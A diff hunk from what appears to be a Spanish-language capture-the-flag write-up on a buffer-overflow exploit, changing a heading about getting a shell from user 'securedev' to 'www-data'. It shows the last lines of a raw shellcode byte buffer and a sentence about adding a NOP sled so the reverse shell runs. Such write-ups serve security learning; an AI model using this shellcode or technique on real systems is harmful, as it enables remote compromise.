@@ -662,7 +662,7 @@ buf += b"\xbb\x67\x43\x87\x2d\x47\x17\x3f\xda\xb8\xf8\xdd"
 buf += b"\x73\x4e\xe5\x73\xd7\xd9\x0b\xc3\xdc\x14\x4b"
 ```
 
-### Obtener una shell como el usuario securedev
+### Obtener una shell como el usuario www-data
 
 Por lo que crearemos un script para automatizar todo esto y tambien añadiremos en el script una cadena de `NOPS` para que salte todo hasta nuestro `shellcode` y se ejecute nuestra `rever shell`.
 
